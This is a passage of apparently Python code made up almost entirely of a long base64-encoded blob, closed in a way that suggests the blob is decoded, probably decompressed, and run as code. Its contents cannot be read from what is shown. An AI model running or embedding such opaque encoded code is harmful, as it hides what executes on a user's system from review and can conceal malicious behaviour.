    "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"
)).decode("utf-8"))